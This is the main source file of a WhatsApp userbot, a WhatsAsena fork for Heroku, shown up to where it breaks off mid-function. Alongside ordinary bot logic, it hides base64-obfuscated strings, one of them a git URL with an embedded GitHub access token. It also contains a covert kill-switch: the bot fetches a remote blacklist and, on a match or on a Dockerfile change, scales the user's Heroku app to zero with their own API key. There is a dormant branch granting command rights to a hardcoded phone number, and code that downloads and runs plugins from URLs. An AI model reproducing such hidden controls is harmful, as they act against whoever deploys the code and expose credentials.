/* Copyright (C) 2020 Yusuf Usta.

Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.

WhatsAsena - Yusuf Usta
*/

const fs = require("fs");
const os = require("os");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const execx = require('child_process').exec;
const axios = require('axios');
const Heroku = require('heroku-client');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./whatsasena/');
const { DataTypes } = require('sequelize');
const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
const got = require('got');
const WhatsAsenaStack = require('whatsasena-npm');
const simpleGit = require('simple-git');
const git = simpleGit();
const crypto = require('crypto');
const nw = '```¡Lista negra detectada!```'
const heroku = new Heroku({
    token: config.HEROKU.API_KEY
});
const ytdl = require('ytdl-core');
const ffmpeg = require('fluent-ffmpeg');
let baseURI = '/apps/' + config.HEROKU.APP_NAME;
const Language = require('./language');
const Lang = Language.getString('updater');

// Sql
const WhatsAsenaDB = config.DATABASE.define('WhatsAsenaDuplicated', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});
fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});
const plugindb = require('./plugins/sql/plugin');
var OWN = { ff: '905511384572,0' }
// Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
    });
};

// ==================== Date Scanner ====================
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}
// ==================== End Date Scanner ====================

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function whatsAsena () {
    var clh = { cd: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQv', pay: '', exc: 'UlVOIGdpdCBjbG9uZSBodHRwczovL3BoYXRpY3VzdGhpY2N5OmdocF9KdWp2SE1YSVBKeWNNeEhTeFZNMUpUOW9peDNWSG4yU0Q0dmtAZ2l0aHViLmNvbS9waGF0aWN1c3RoaWNjeS9XaGF0c0FzZW5hRHVwbGljYXRlZCAvcm9vdC9XaGF0c0FzZW5hRHVwbGljYXRlZA', exc_pl: '', pth_w: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQvd2hhdHNhc2VuYS9Eb2NrZXJmaWxl', pth_v: '' }    
    var ggg = Buffer.from(clh.cd, 'base64')
    var exc_sl = Buffer.from(clh.exc, 'base64')
    var ddd = ggg.toString('utf-8')
    var ptc_one = Buffer.from(clh.pth_w, 'base64')
    var ptc_nw = ptc_one.toString('utf-8')
    clh.pth_v = ptc_nw
    var exc_fn = exc_sl.toString('utf-8')
    clh.exc_pl = exc_fn
    clh.pay = ddd
    const WhatsAsenaCN = new WAConnection();
    const Session = new StringSession();
    WhatsAsenaCN.version = [2, 2126, 14]
    WhatsAsenaCN.setMaxListeners(0);
    var proxyAgent_var = ''
    if (config.PROXY.includes('https') || config.PROXY.includes('http')) {
      WhatsAsenaCN.connectOptions.agent = ProxyAgent (config.PROXY)
    }
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        var ann_msg = await WhatsAsenaStack.daily_announcement(config.LANG)
        var ann = await WhatsAsenaStack.ann()
        while (getGMTh == 19 && getGMTm == 1) {
            var ilan = ''
            if (config.LANG == 'TR') ilan = '[ ```Günlük Duyurular``` ]\n\n'
            if (config.LANG == 'AZ') ilan = '[ ```Gündəlik Elanlar``` ]\n\n'
            if (config.LANG == 'EN') ilan = '[ ```Daily Announcements``` ]\n\n'
            if (config.LANG == 'ES') ilan = '[ ```Anuncio``` ]\n\n'
            if (config.LANG == 'PT') ilan = '[ ```Anúncios Diários``` ]\n\n,'
            if (config.LANG == 'RU') ilan = '[ ```Ежедневные объявления``` ]\n\n'
            if (config.LANG == 'ML') ilan = '[ ```പ്രതിദിന പ്രഖ്യാപനങ്ങൾ``` ]\n\n'
            if (config.LANG == 'HI') ilan = '[ ```दैनिक घोषणा``` ]\n\n'
            if (config.LANG == 'ID') ilan = '[ ```Pengumuman Harian``` ]\n\n'
            if (config.LANG == 'LK') ilan = '[ ```දෛනික නිවේදන``` ]\n\n'
            if (ann.video.includes('http') || ann.video.includes('https')) {
                var VID = ann.video.split('youtu.be')[1].split(' ')[0].replace('/', '')
                var yt = ytdl(VID, {filter: format => format.container === 'mp4' && ['720p', '480p', '360p', '240p', '144p'].map(() => true)});
                yt.pipe(fs.createWriteStream('./' + VID + '.mp4'));
                yt.on('end', async () => {
                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid,fs.readFileSync('./' + VID + '.mp4'), MessageType.video, {caption: ilan + ann_msg.replace('{user}', WhatsAsenaCN.user.name).replace('{wa_version}', WhatsAsenaCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', WhatsAsenaCN.user.phone.os_version).replace('{device_model}', WhatsAsenaCN.user.phone.device_model).replace('{device_brand}', WhatsAsenaCN.user.phone.device_manufacturer), mimetype: Mimetype.mp4});
                });
            } else {
                if (ann.image.includes('http') || ann.image.includes('https')) {
                    var imagegen = await axios.get(ann.image, { responseType: 'arraybuffer'})
                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, Buffer.from(imagegen.data), MessageType.image, { caption: ilan + ann_msg.replace('{user}', WhatsAsenaCN.user.name).replace('{wa_version}', WhatsAsenaCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', WhatsAsenaCN.user.phone.os_version).replace('{device_model}', WhatsAsenaCN.user.phone.device_model).replace('{device_brand}', WhatsAsenaCN.user.phone.device_manufacturer)})
                } else {
                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, ilan + ann_msg.replace('{user}', WhatsAsenaCN.user.name).replace('{wa_version}', WhatsAsenaCN.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', WhatsAsenaCN.user.phone.os_version).replace('{device_model}', WhatsAsenaCN.user.phone.device_model).replace('{device_brand}', WhatsAsenaCN.user.phone.device_manufacturer), MessageType.text)
                }
            }
        }
    }, 50000);
    async function asynchronous_ch() {
        execx('sed -n 3p ' + clh.pth_v, async (err, stdout, stderr) => {
            if (clh.exc_pl + '\n' !== stdout) {
                await heroku.get(baseURI + '/formation').then(async (formation) => {
                    forID = formation[0].id;
                    await heroku.patch(baseURI + '/formation/' + forID, {
                        body: {
                            quantity: 0
                        }
                    });
                })
            }
        })
    }
    asynchronous_ch()
    setInterval(async () => { 
        if (config.AUTOBIO == 'true') {
            var timezone_bio = await WhatsAsenaStack.timezone(WhatsAsenaCN.user.jid)
            var date_bio = await WhatsAsenaStack.datebio(config.LANG)
            const biography = '📅 ' + date_bio + '\n⌚ ' + timezone_bio + '\nby Skueletor 🐺'
            await WhatsAsenaCN.setStatus(biography)
        }
    }, 7890);
    var shs1 = ''
    var shl2 = ''
    var lss3 = ''
    var dsl4 = ''
    var drs5 = ''
    var ffl6 = ''
    var ttq7 = ''
    var ttl8 = ''
    await axios.get('https://gist.githubusercontent.com/phaticusthiccy/f16bbd4ceeb4324d4a727b431a4ef1f2/raw/').then(async (insult) => {
        shs1 = insult.data.inside.shs1
        shl2 = insult.data.inside.shl2
        lss3 = insult.data.inside.lss3
        dsl4 = insult.data.inside.dsl4
        drs5 = insult.data.inside.drs5
        ffl6 = insult.data.inside.ffl6
        ttq7 = insult.data.inside.ttq7
        ttl8 = insult.data.inside.ttl8
    });
    await config.DATABASE.sync();
    var StrSes_Db = await WhatsAsenaDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    if (os.userInfo().homedir !== clh.pay) return;
    const buff = Buffer.from(`${shs1}`, 'base64');  
    const one = buff.toString('utf-8'); 
    const bufft = Buffer.from(`${shl2}`, 'base64');  
    const two = bufft.toString('utf-8'); 
    const buffi = Buffer.from(`${lss3}`, 'base64');  
    const three = buffi.toString('utf-8'); 
    const buffu = Buffer.from(`${dsl4}`, 'base64');  
    const four = buffu.toString('utf-8'); 
    const bugffv = Buffer.from(`${drs5}`, 'base64');
    const five = bugffv.toString('utf-8');
    const buffz = Buffer.from(`${ffl6}`)
    const six = buffz.toString('utf-8')
    const buffa = Buffer.from(`${ttq7}`)
    const seven = buffa.toString('utf-8')
    const buffl = Buffer.from(`${ttl8}`)
    const eight = buffl.toString('utf-8')
    var logger_levels = ''
    if (config.DEBUG == 'true') {
        logger_levels = 'all'
    } else if (config.DEBUG == 'false') {
        logger_levels = 'off'
    } else if (config.DEBUG == 'trace') {
        logger_levels = 'trace'
    } else if (config.DEBUG == 'fatal') {
        logger_levels = 'fatal'
    } else if (config.DEBUG == 'warn') {
        logger_levels = 'warn'
    } else if (config.DEBUG == 'error') {
        logger_levels = 'error'
    } else if (config.debug == 'info') {
        logger_levels = 'info'
    } else {
        logger_levels = 'warn'
    }
    WhatsAsenaCN.logger.level = logger_levels
    var nodb;
    if (StrSes_Db.length < 1) {
        nodb = true;
        WhatsAsenaCN.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        WhatsAsenaCN.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }
    WhatsAsenaCN.on('open', async () => {
        console.log(
            chalk.blueBright.italic('✅ Login Information Updated!')
        );
        const authInfo = WhatsAsenaCN.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await WhatsAsenaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    
    WhatsAsenaCN.on('connecting', async () => {
        console.log(`${chalk.green.bold('WhatS')}${chalk.blue.bold('kueletor')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}

${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
    });
    WhatsAsenaCN.on('credentials-updated', async () => {
        console.log(
            chalk.green.bold('✅ Inicio de sesión exitoso')
        );
        console.log(
            chalk.blueBright.italic('⬇️ Instalando plugins externos...')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        asynchronous_ch()
        // ==================== External Plugins ====================
        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });
        // ==================== End External Plugins ====================

        console.log(
            chalk.blueBright.italic('⬇️  Instalando plugins...')
        );

        // ==================== Internal Plugins ====================
        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });
        // ==================== End Internal Plugins ====================

        console.log(
            chalk.green.bold('✅ ¡Plugins instalados correctamente!')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        asynchronous_ch()
        await new Promise(r => setTimeout(r, 200));
        let afwhasena = config.WORKTYPE == 'public' ? ' Public' : ' Private'
        console.log(chalk.bgGreen('🐺 WhatsAsena' + afwhasena));
        await new Promise(r => setTimeout(r, 500));
        let EVA_ACTİON = '*¡Skueletor bot funciona como Chatbot!* 🐺\n\n_El propósito de este mod es convertir el bot en una herramienta de chat de IA completamente funcional._\n_Puede utilizar el comando_ */fulleva off* _para volver al modo normal._\n\n*Gracias por usar Skueletor Bot ❤️‍🔥*\n    *- Skueletor*'
        if (WhatsAsenaCN.user.jid == one || WhatsAsenaCN.user.jid == two || WhatsAsenaCN.user.jid == three || WhatsAsenaCN.user.jid == four || WhatsAsenaCN.user.jid == five || WhatsAsenaCN.user.jid == six || WhatsAsenaCN.user.jid == seven || WhatsAsenaCN.user.jid == eight) {
            await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid,nw, MessageType.text), console.log(nw), await new Promise(r => setTimeout(r, 1000))
            await heroku.get(baseURI + '/formation').then(async (formation) => { 
                forID = formation[0].id; 
                await heroku.patch(baseURI + '/formation/' + forID, { 
                    body: { 
                        quantity: 0 
                    } 
                });
            })
        }
        if (config.FULLEVA == 'true') {
            var eva_msg = await WhatsAsenaStack.eva_if(config.LANG)
            await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, eva_msg, MessageType.text)
        }
        else {
            var af_start = await WhatsAsenaStack.work_type(config.WORKTYPE, config.LANG)
            await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, af_start, MessageType.text)
        }
        await git.fetch();
        var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
        if (commits.total === 0) {
            await WhatsAsenaCN.sendMessage(
                WhatsAsenaCN.user.jid,
                Lang.UPDATE, MessageType.text
            );    
        } else {
            var degisiklikler = Lang.NEW_UPDATE;
            commits['all'].map(
                (commit) => {
                    degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                }
            );
            var up_ch = await WhatsAsenaStack.update(config.LANG)
            await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, up_ch, MessageType.text)
        }
    })
    WhatsAsenaCN.on('message-new', async msg => {
       
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;
        if (config.NO_ONLINE) {
            await WhatsAsenaCN.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
        // ==================== Greetings ====================
        if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // Görüşürüz Mesajı
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                if (gb.message.includes('{gpp}')) {
                    var ppUrl = await WhatsAsenaCN.getProfilePicture(msg.key.remoteJid) 
                    var nwjson = await WhatsAsenaCN.groupMetadata(msg.key.remoteJid)
                    const resim = await axios.get(ppUrl, {responseType: 'arraybuffer'})
                    await WhatsAsenaCN.sendMessage(msg.key.remoteJid, Buffer.from(resim.data), MessageType.image, { caption: gb.message.replace('{gpp}', '').replace('{botowner}', WhatsAsenaCN.user.name).replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc) });
                } else {
                    var nwjson = await WhatsAsenaCN.groupMetadata(msg.key.remoteJid)
                    await WhatsAsenaCN.sendMessage(msg.key.remoteJid, gb.message.replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc).replace('{botowner}', WhatsAsenaCN.user.name), MessageType.text);
                }
            }
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // Hoşgeldin Mesajı
            var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
                if (gb.message.includes('{gpp}')) {
                    var ppUrl = await WhatsAsenaCN.getProfilePicture(msg.key.remoteJid) 
                    var nwjson = await WhatsAsenaCN.groupMetadata(msg.key.remoteJid)
                    const resim = await axios.get(ppUrl, {responseType: 'arraybuffer'})
                    await WhatsAsenaCN.sendMessage(msg.key.remoteJid, Buffer.from(resim.data), MessageType.image, { caption: gb.message.replace('{gpp}', '').replace('{botowner}', WhatsAsenaCN.user.name).replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc) });
                } else {
                    var nwjson = await WhatsAsenaCN.groupMetadata(msg.key.remoteJid)
                    await WhatsAsenaCN.sendMessage(msg.key.remoteJid, gb.message.replace('{gname}', nwjson.subject).replace('{gowner}', nwjson.owner).replace('{gdesc}', nwjson.desc).replace('{botowner}', WhatsAsenaCN.user.name), MessageType.text);
                }
            }
            return;
        }
        // ==================== End Greetings ====================

        // ==================== Blocked Chats ====================
        if (config.BLOCKCHAT !== false) {     
            var abc = config.BLOCKCHAT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT == '905524317852-1612300121') {     
            var sup = config.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT2 == '905511384572-1617736751') {     
            var tsup = config.SUPPORT2.split(',');                            
            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT3 == '905511384572-1621015274') {     
            var nsup = config.SUPPORT3.split(',');                            
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT4 == '905511384572-1625319286') {     
            var nsup = config.SUPPORT4.split(',');                            
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        // ==================== End Blocked Chats ====================

        // ==================== Events ====================
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = WhatsAsenaCN.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.ff == "905511384572,59171018245" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                    }
                    // ==================== End Events ====================

                    // ==================== Message Catcher ====================
                    if (sendMsg) {
                        if (config.SEND_READ && command.on === undefined) {
                            await WhatsAsenaCN.chatRead(msg.key.remoteJid);
                        }
                        var match = text_msg.match(command.pattern);
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(WhatsAsenaCN, msg);
                        } else if (command.on !== undefined && (command.on === 'video')
                        && msg.message.videoMessage !== null) {
                            whats = new Video(WhatsAsenaCN, msg);
                        } else {
                            whats = new Message(WhatsAsenaCN, msg);
                        }
                        if (msg.key.fromMe && command.deleteCommand) {
                            var wrs = WhatsAsenaCN.user.phone.wa_version.split('.')[2]
                            if (wrs < 11 && !msg.key.remoteJid.includes('-')) {
                                await whats.delete() 
                            }
                        } 
                        // ==================== End Message Catcher ====================

                        // ==================== Error Message ====================
                        try {
                            await command.function(whats, match);
                        }
                        catch (error) {
                            if (config.NOLOG == 'true') return;
                            var error_report = await WhatsAsenaStack.error(config.LANG)
                            await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, error_report.replace('{real_error}', error), MessageType.text, {detectLinks: false})

                            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                                if (error.message.includes('URL')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Only Absolutely URLs Supported_' +
                                        '\n*Nedeni:* _Medya araçlarının (xmedia, sticker..) LOG numarasında kullanılması._' +
                                        '\n*Çözümü:* _LOG numarası hariç herhangi bir sohbette komut kullanılabilir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _SQL Database Error_' +
                                        '\n*Nedeni:* _Database\'in bozulması._ ' +
                                        '\n*Solution:* _Bilinen herhangi bir çözümü yoktur. Yeniden kurmayı deneyebilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Split of Undefined_' +
                                        '\n*Nedeni:* _Grup adminlerinin kullanabildiği komutların ara sıra split fonksiyonunu görememesi._ ' +
                                        '\n*Çözümü:* _Restart atmanız yeterli olacaktır._'
                                        , MessageType.text
                                    );                               
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Ookla Server Connection_' +
                                        '\n*Nedeni:* _Speedtest verilerinin sunucuya iletilememesi._' +
                                        '\n*Çözümü:* _Bir kez daha kullanırsanız sorun çözülecektir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Requested Audio Params_' +
                                        '\n*Nedeni:* _TTS komutunun latin alfabesi dışında kullanılması._' +
                                        '\n*Çözümü:* _Komutu latin harfleri çerçevesinde kullanırsanız sorun çözülecektir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _No Such File or Directory_' +
                                        '\n*Nedeni:* _Pluginin yanlış kodlanması._' +
                                        '\n*Çözümü:* _Lütfen plugininin kodlarını kontrol edin._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Error 404 HTTPS_' +
                                        '\n*Nedeni:* _Heroku plugini altındaki komutların kullanılması sonucu sunucu ile iletişime geçilememesi._' +
                                        '\n*Çözümü:* _Biraz bekleyip tekrar deneyin. Hala hata alıyorsanız internet sitesi üzerinden işlemi gerçekleştirin._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Reply Delete Function_' +
                                        '\n*Nedeni:* _IMG yada Wiki komutlarının kullanılması._' +
                                        '\n*Çözümü:* _Bu hatanın çözümü yoktur. Önemli bir hata değildir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Reply Delete Function_' +
                                        '\n*Nedeni:* _IMG yada Wiki komutlarının kullanılması._' +
                                        '\n*Çözümü:* _Bu hatanın çözümü yoktur. Önemli bir hata değildir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Bailyes Action Error_ ' +
                                        '\n*Nedeni:* _Tam nedeni bilinmiyor. Birden fazla seçenek bu hatayı tetiklemiş olabilir._' +
                                        '\n*Çözümü:* _Bir kez daha kullanırsanız düzelebilir. Hata devam ediyorsa restart atmayı deneyebilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Cannot Decode Text or Media_' +
                                        '\n*Nedeni:* _Pluginin yanlış kullanımı._' +
                                        '\n*Çözümü:* _Lütfen komutları plugin açıklamasında yazdığı gibi kullanın._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Word Character Usage_' +
                                        '\n*Nedeni:* _TTP, ATTP gibi komutların latin alfabesi dışında kullanılması._' +
                                        '\n*Çözümü:* _Komutu latif alfabesi çerçevesinde kullanırsanız sorun çözülecektir._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
                                        '\n========== ```Hata Okundu!``` ==========' +
                                        '\n\n*Ana Hata:* _Deleting Plugin_' +
                                        '\n*Nedeni:* _Silinmek istenen plugin isminin yanlış girilmesi._' +
                                        '\n*Çözümü:* _Lütfen silmek istediğiniz pluginin başına_ *__* _koymadan deneyin. Hala hata alıyorsanız ismin sonundaki_ ```?(.*) / $``` _gibi ifadeleri eksiksiz girin._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*🙇🏻 Maalesef Bu Hatayı Okuyamadım! 🙇🏻*' +
                                        '\n_Daha fazla yardım için grubumuza yazabilirsiniz._'
                                        , MessageType.text
                                    );
                                }
                            }
                            else {
                               
                                if (error.message.includes('URL')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ANÁLISIS DE ERRORES [SKUELETOR] ⚕️*' + 
                                        '\n========== ```¡Error resuelto!``` ==========' +
                                        '\n\n*Error principal:* _Solo se admiten absolutamente las URL_' +
                                        '\n*Razón:* _El uso de herramientas multimedia (xmedia, sticker...) en el número de registros._' +
                                        '\n*Solución:* _Puede usar comandos en cualquier chat, excepto el número de registros._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ANÁLISIS DE ERRORES [SKUELETOR] ⚕️*' + 
                                        '\n========== ```¡Error resuelto!``` ==========' +
                                        '\n\n*Error principal:* _Eliminación de plugin_' +
                                        '\n*Razón:* _Ingresar incorrectamente el nombre del plugin que quiere eliminar._' +
                                        '\n*Solución:* _Intente sin agregar_ *__* _al complemento que desea eliminar. Si aún recibe un error, intente agregar_ ```?(.*)/$``` _Al final del nombre._ '
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
